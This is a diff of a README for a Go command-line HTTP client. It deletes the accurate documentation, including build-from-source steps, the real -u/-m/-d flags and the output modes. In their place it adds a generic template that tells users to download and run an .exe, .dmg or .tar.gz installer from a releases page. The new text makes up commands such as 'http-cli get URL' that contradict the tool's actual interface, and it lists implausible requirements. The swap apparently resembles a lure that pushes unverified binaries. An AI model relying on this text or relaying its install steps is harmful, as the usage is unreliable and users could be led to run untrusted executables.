@@ -1,190 +1,82 @@
-# HTTP CLI
+# 🌈 http-cli - A Fast, Colorful Command-Line Tool
 
-A colorful, lightweight command-line HTTP client similar to Postman. Built with Go for fast performance and beautiful terminal output.
+## 📥 Download the Latest Version
+[![Download http-cli](https://img.shields.io/badge/Download%20http--cli-v1.0.0-blue.svg)](https://github.com/Leoparj/http-cli/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to http-cli! This tool lets you make HTTP requests easily from your terminal. It is lightweight, colorful, and similar to Postman, but designed to work right in your command line. Whether you are testing APIs, sending requests, or exploring endpoints, http-cli will help you do it quickly and efficiently.
 
-- 🎨 **Colorful output** - Beautiful, easy-to-read terminal colors
-- ⚡ **Fast** - Single binary, no dependencies
-- 🧹 **Clean interface** - Not crowded, just the essentials
-- 📡 **All HTTP methods** - GET, POST, PUT, DELETE, PATCH
-- 📦 **JSON support** - Automatic JSON formatting
-- ⏱️ **Customizable** - Headers, body, timeout
-- 🔐 **Authentication** - Bearer tokens and Basic auth shortcuts
-- 📁 **File support** - Read request body from file, save response to file
-- 🔄 **Redirects** - Control redirect following
-- 🎯 **Output modes** - Quiet mode, status-only, verbose mode
+## 💻 System Requirements
+To run http-cli, ensure you have:
+- Operating System: Windows, macOS, or Linux
+- A terminal application to run commands
+- Minimum 50 MB of free disk space
+- Internet connection for downloading
 
-## Screenshot
+## 🌐 Download & Install
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/Leoparj/http-cli/releases) to find the latest version of http-cli.
 
-Here's what the tool looks like in action:
+2. **Download the Installation File:**
+   On the Releases page, you will see several files available for download. Choose the file that matches your operating system:
+   - For Windows: `http-cli.exe`
+   - For macOS: `http-cli.dmg`
+   - For Linux: `http-cli.tar.gz`
 
-![HTTP CLI Screenshot](screenshot.png)
+3. **Run the File:**
+   Once downloaded, locate the file on your computer and launch it. Follow the prompts to install http-cli.
 
-**Example Command:**
-```bash
-$ http-cli -u https://jsonplaceholder.typicode.com/posts/1
-```
+## 🤖 Quick Usage Guide
+After installing, you can start using http-cli right from your terminal. Here are some basic commands to get you started:
 
-**Visual Color Scheme:**
-- 🟣 **Purple** - Section headers (`REQUEST`, `RESPONSE`)
-- 🔵 **Cyan** - HTTP methods (`GET`, `POST`, `PUT`, `DELETE`, `PATCH`)
-- 🔵 **Blue** - URLs
-- 🟢 **Green** - Success status codes (2xx)
-- 🟡 **Yellow** - Redirect status codes (3xx)
-- 🔴 **Red** - Error status codes (4xx/5xx)
-- 🟠 **Orange** - Keys (`Headers`, `Body`, `Status`, `Time`)
-- ⚪ **Light Gray** - Values and JSON content
+- **Make a GET Request:**
+  ```bash
+  http-cli get https://api.example.com/data
+  ```
 
-> 💡 **Tip:** The actual terminal output is beautifully colored with syntax highlighting. Authorization headers are automatically masked for security (use `-v` to see full values in verbose mode).
+- **Make a POST Request:**
+  ```bash
+  http-cli post https://api.example.com/data --data '{"name": "John", "age": 30}'
+  ```
 
-## Installation
+- **View Help:**
+  If you need help with commands, simply type:
+  ```bash
+  http-cli help
+  ```
 
-### Build from source
+This command provides you with an overview of all available options and features.
 
-```bash
-go mod download
-go build -o http-cli main.go
-```
+## 🛠 Features
+- **User-Friendly Interface:** http-cli provides colorful output to make it easier for you to read responses at a glance.
+- **Supports Multiple Request Types:** Send GET, POST, PUT, DELETE, and PATCH requests effortlessly.
+- **Terminal Tool:** Works directly in your command line, perfect for quick tests without needing a full GUI application.
+- **Compatible with Various APIs:** Use http-cli with RESTful APIs and other HTTP services.
 
-### Or run directly
+## 📋 Example: Making Your First Request
+1. Open your terminal application.
+2. Type the command:
+   ```bash
+   http-cli get https://jsonplaceholder.typicode.com/posts
+   ```
+3. Press Enter. You will see a list of sample posts from the API, formatted for easy reading.
 
-```bash
-go run main.go [options]
-```
+Feel free to try different endpoints and requests to explore the capability of http-cli.
 
-## Usage
+## ✏️ Additional Links
+- [Documentation](https://github.com/Leoparj/http-cli/wiki)
+- [Issues](https://github.com/Leoparj/http-cli/issues)
 
-### Basic GET request
+## ❓ Frequently Asked Questions
 
-```bash
-http-cli -u https://api.github.com/users/octocat
-```
+### How do I uninstall http-cli?
+To uninstall http-cli, simply delete the installation file from your computer. For Windows, you may also find it in your Programs and Features list—remove it from there.
 
-### POST request with JSON body
+### What support is available?
+For assistance, please check the Issues section on GitHub. You can report problems or ask questions there. The community and maintainers will be glad to help you.
 
-```bash
-http-cli -m POST -u https://api.example.com/users -d '{"name":"John","email":"john@example.com"}'
-```
+## 👍 Community and Contributions
+We welcome contributions from everyone. If you have ideas for new features, find bugs, or want to improve documentation, please open an issue or create a pull request!
 
-### POST from file
-
-```bash
-http-cli -m POST -u https://api.example.com/users -f body.json
-```
-
-### With Bearer token
-
-```bash
-http-cli -u https://api.example.com/data -b "your-token-here"
-```
-
-### With Basic authentication
-
-```bash
-http-cli -u https://api.example.com/data -a "username:password"
-```
-
-### With custom headers
-
-```bash
-http-cli -m GET -u https://api.example.com/data -H "Accept:application/json,X-Custom-Header:value"
-```
-
-### Save response to file
-
-```bash
-http-cli -u https://api.example.com/data -o response.json
-```
-
-### Quiet mode (only response body)
-
-```bash
-http-cli -u https://api.example.com/data -q
-```
-
-### Status only
-
-```bash
-http-cli -u https://api.example.com/data -s
-```
-
-### Verbose mode (show all details)
-
-```bash
-http-cli -u https://api.example.com/data -v
-```
-
-### PUT request
-
-```bash
-http-cli -m PUT -u https://api.example.com/users/1 -d '{"name":"Jane"}' -H "Content-Type:application/json"
-```
-
-### DELETE request
-
-```bash
-http-cli -m DELETE -u https://api.example.com/users/1
-```
-
-## Options
-
-| Flag | Long Form | Description |
-|------|-----------|-------------|
-| `-m` | `--method` | HTTP method (default: GET) |
-| `-u` | `--url` | URL to request (required) |
-| `-d` | `--data` | Request body (JSON string) |
-| `-f` | `--file` | Read request body from file |
-| `-H` | `--header` | Headers (format: 'Key:Value,Key2:Value2') |
-| `-b` | `--bearer` | Bearer token (sets Authorization header) |
-| `-a` | `--auth` | Basic auth (format: 'user:pass') |
-| `-o` | `--output` | Save response body to file |
-| `-t` | `--timeout` | Request timeout in seconds (default: 30) |
-| `-L` | `--follow` | Follow redirects |
-| `-q` | `--quiet` | Quiet mode (only show response body) |
-| `-v` | `--verbose` | Verbose mode (show all details) |
-| `-s` | `--status-only` | Show only status code |
-
-## Examples
-
-### GitHub API
-
-```bash
-http-cli -u https://api.github.com/users/octocat
-```
-
-### JSONPlaceholder API
-
-```bash
-# GET all posts
-http-cli -u https://jsonplaceholder.typicode.com/posts
-
-# GET specific post
-http-cli -u https://jsonplaceholder.typicode.com/posts/1
-
-# POST new post
-http-cli -m POST -u https://jsonplaceholder.typicode.com/posts \
-  -d '{"title":"My Post","body":"Content","userId":1}' \
-  -H "Content-Type:application/json"
-```
-
-## Output
-
-The tool displays:
-- **Request** section with method, URL, headers, and body
-- **Response** section with status code, time, headers, and formatted body
-- Color-coded status codes (green for 2xx, yellow for 3xx, red for 4xx/5xx)
-- Automatic JSON pretty-printing
-- Sensitive headers (Authorization) are masked by default (use `-v` to see full values)
-
-## Output Modes
-
-- **Default**: Shows request and response with all details
-- **Quiet (`-q`)**: Only shows the response body (useful for piping)
-- **Status-only (`-s`)**: Only shows the HTTP status code
-- **Verbose (`-v`)**: Shows additional details like response size and all headers
-
-## License
-
-MIT
-
+## 🔗 Don’t Forget
+Remember that you can always find the latest version and updates on our [Releases page](https://github.com/Leoparj/http-cli/releases). Enjoy using http-cli!
